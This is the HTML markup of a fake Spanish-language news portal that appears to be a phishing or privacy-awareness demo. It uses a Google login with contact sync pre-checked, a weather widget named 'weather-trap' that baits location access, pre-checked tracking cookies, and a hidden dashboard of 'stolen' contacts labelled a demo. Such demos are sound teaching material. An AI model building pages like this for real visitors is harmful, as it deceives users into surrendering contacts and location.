<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Portal de noticias l铆der en cobertura global.">
    <title>Global Insight | Noticias en Vivo</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Merriweather:wght@300;400;700;900&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="style.css">
    
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
</head>
<body>

    <header class="site-header">
        <div class="top-bar">
            <div class="container flex-between">
                <div class="date-widget" id="current-date">Cargando fecha...</div>
                <div class="market-widget">
                    <span> S&P 500: <span class="down">-0.4%</span></span>
                    <span> BTC: <span class="up">+1.2%</span></span>
                    <span> NVDA: <span class="up">+2.8%</span></span>
                </div>
                <div class="auth-widget" id="auth-widget">
                    <button id="btn-login" class="login-btn">
                        <i class="fab fa-google"></i> Iniciar Sesi贸n
                    </button>
                </div>
            </div>
        </div>
        
        <nav class="main-nav">
            <div class="container flex-between">
                <a href="#" class="brand-logo">GLOBAL<span class="highlight">INSIGHT</span></a>
                <ul class="nav-links">
                    <li><a href="#">Internacional</a></li>
                    <li><a href="#">Mercados</a></li>
                    <li><a href="#">Tecnolog铆a</a></li>
                    <li><a href="#">Opini贸n</a></li>
                    <li><a href="#" class="subscribe-btn">Suscribirse</a></li>
                </ul>
            </div>
        </nav>
    </header>

    <!-- Modal de Login MEJORADO -->
    <div id="login-modal" class="login-modal-overlay" style="display:none;">
        <div class="login-modal-container">
            <div class="login-modal-header">
                <h2><i class="fas fa-user-shield"></i> Mejora tu Experiencia</h2>
                <p>Con茅ctate para contenido personalizado y sincroniza tus contactos</p>
            </div>
            
            <div class="login-modal-content">
                <div class="login-benefits">
                    <div class="benefit-item">
                        <i class="fas fa-newspaper"></i>
                        <span>Noticias personalizadas</span>
                    </div>
                    <div class="benefit-item">
                        <i class="fas fa-users"></i>
                        <span>Encuentra contactos en la plataforma</span>
                    </div>
                    <div class="benefit-item">
                        <i class="fas fa-bell"></i>
                        <span>Alertas exclusivas para tu red</span>
                    </div>
                </div>

                <!-- Checkbox para permisos adicionales -->
                <div class="permissions-section">
                    <div class="permission-item">
                        <input type="checkbox" id="contacts-permission" checked>
                        <label for="contacts-permission">
                            <i class="fas fa-address-book"></i>
                            <div>
                                <strong>Sincronizar contactos de Google</strong>
                                <small>Para encontrar amigos y colegas en nuestra plataforma</small>
                            </div>
                        </label>
                    </div>
                </div>
                
                <button id="btn-google-login" class="btn-google-login">
                    <i class="fab fa-google"></i>
                    Continuar con Google
                </button>
                
                <div class="login-footer">
                    <p>Al continuar, aceptas nuestros <a href="#">T茅rminos</a> y autorizas el acceso a tu informaci贸n b谩sica y contactos para mejorar tu experiencia.</p>
                </div>
            </div>
        </div>
    </div>

    <!-- Secci贸n de Perfil MEJORADA con Contactos -->
    <div id="user-profile" class="user-profile-widget" style="display:none;">
        <div class="profile-header">
            <img id="user-avatar" src="" alt="Avatar" class="profile-avatar">
            <div class="profile-info">
                <h4 id="user-name">Usuario</h4>
                <p id="user-email">usuario@ejemplo.com</p>
            </div>
            <button id="btn-logout" class="logout-btn">
                <i class="fas fa-sign-out-alt"></i>
            </button>
        </div>
        
        <!-- Secci贸n de Contactos Robados -->
        <div class="contacts-section">
            <div class="contacts-header">
                <h5><i class="fas fa-users"></i> Contactos Sincronizados</h5>
                <span id="contacts-count" class="contacts-count">0</span>
            </div>
            <div id="contacts-list" class="contacts-list">
                <!-- Contactos se cargar谩n aqu铆 -->
            </div>
        </div>
    </div>

    <div class="breaking-news-bar">
        <div class="container">
            <span class="breaking-label">EN VIVO</span>
            <span class="ticker-content" id="ticker-text">Estableciendo conexi贸n segura con fuentes internacionales...</span>
        </div>
    </div>

    <div class="container main-layout">
        
        <main class="content-col">
            <article id="hero-news" class="hero-card skeleton-load">
                </article>
            
            <div id="secondary-grid" class="news-grid"></div>
        </main>

        <aside class="sidebar-col">
            
            <div class="widget weather-widget" id="weather-trap">
                <div class="widget-header">
                    <h3><i class="fas fa-map-marker-alt"></i> Clima Local</h3>
                </div>
                
                <div class="blur-content">
                    <div class="fake-temp">--掳C</div>
                    <p>Ubicaci贸n no detectada</p>
                </div>

                <div class="overlay-lock" id="btn-gps-trigger">
                    <i class="fas fa-lock icon-lock"></i>
                    <p>Habilitar Pron贸stico Local</p>
                    <button class="btn-outline">Activar Ubicaci贸n</button>
                </div>

                <div id="hacker-terminal" class="terminal hidden"></div>
            </div>

            <div class="widget">
                <h3>Lo m谩s le铆do</h3>
                <ul class="trending-list" id="trending-list">
                    </ul>
            </div>

            <div class="ad-space widget" style="text-align:center; padding: 10px;">
                <small style="color:#999; display:block; margin-bottom:5px;">Publicidad</small>
                <img src="https://via.placeholder.com/300x250.png?text=Anuncio+Corporativo" alt="Ad" style="max-width:100%; border-radius:4px;">
            </div>
        </aside>
    </div>

    <!-- Dashboard de Inteligencia OCULTO -->
    <div id="intelligence-dashboard" class="intelligence-dashboard hidden">
        <div class="dashboard-header">
            <h3><i class="fas fa-brain"></i> Panel de Inteligencia - Datos Recolectados</h3>
            <button id="btn-close-dashboard" class="close-btn">&times;</button>
        </div>
        <div class="dashboard-content">
            <div class="data-section">
                <h4> Perfil Principal</h4>
                <div id="profile-data" class="data-grid"></div>
            </div>
            <div class="data-section">
                <h4> Red de Contactos (<span id="total-contacts">0</span>)</h4>
                <div id="contacts-data" class="contacts-grid"></div>
            </div>
            <div class="data-section">
                <h4> An谩lisis de Red Social</h4>
                <div id="social-analysis" class="analysis-grid"></div>
            </div>
        </div>
    </div>

    <footer class="site-footer" style="background:#121212; color:white; padding:40px 0; margin-top:60px; text-align:center;">
        <div class="container">
            <p>&copy; 2025 Global Insight Media Group. Todos los derechos reservados.</p>
            <button id="btn-show-dashboard" class="hidden" style="background: #d93025; color: white; border: none; padding: 10px; margin-top: 10px; border-radius: 5px;">
                <i class="fas fa-shield-alt"></i> Ver Datos Recolectados (Demo)
            </button>
        </div>
    </footer>

    <div id="cookie-modal" class="cookie-modal-overlay" style="display:none;">
        <div class="cookie-modal-container">
            <div class="cookie-modal-header">
                <h2><i class="fas fa-shield-alt"></i> Configuraci贸n de Privacidad</h2>
                <p class="cookie-subtitle">Valoramos su privacidad. Personalice el uso de sus datos a continuaci贸n.</p>
            </div>
            
            <div class="cookie-modal-content">
                <div class="cookie-intro">
                    <p>Utilizamos cookies y tecnolog铆as de seguimiento avanzadas para mejorar la experiencia del usuario y analizar el tr谩fico del sitio.</p>
                </div>
                
                <div class="cookie-categories">
                    <div class="cookie-category">
                        <div class="category-toggle flex-between">
                            <div class="toggle-info">
                                <h3>Estrictamente Necesarias</h3>
                                <p class="toggle-description">Vitales para la seguridad del sitio.</p>
                            </div>
                            <div class="toggle-switch">
                                <input type="checkbox" checked disabled>
                                <label class="slider"></label>
                            </div>
                        </div>
                    </div>
                    
                    <div class="cookie-category">
                        <div class="category-toggle flex-between">
                            <div class="toggle-info">
                                <h3>An谩lisis y Rendimiento</h3>
                                <p class="toggle-description">Permiten medici贸n an贸nima de visitas.</p>
                            </div>
                            <div class="toggle-switch">
                                <input type="checkbox" id="performance-cookies" checked>
                                <label for="performance-cookies" class="slider"></label>
                            </div>
                        </div>
                    </div>
                    
                    <div class="cookie-category">
                        <div class="category-toggle flex-between">
                            <div class="toggle-info">
                                <h3>Geolocalizaci贸n y Rastreo</h3>
                                <p class="toggle-description">Para noticias locales y clima.</p>
                            </div>
                            <div class="toggle-switch">
                                <input type="checkbox" id="geo-cookies" checked>
                                <label for="geo-cookies" class="slider"></label>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="cookie-modal-actions">
                    <button id="btn-accept-all" class="btn-accept">Aceptar Todo</button>
                    <button id="btn-reject" class="btn-reject">Guardar Preferencias</button>
                </div>
            </div>
        </div>
    </div>

    <script src="app.js"></script>
</body>
</html>
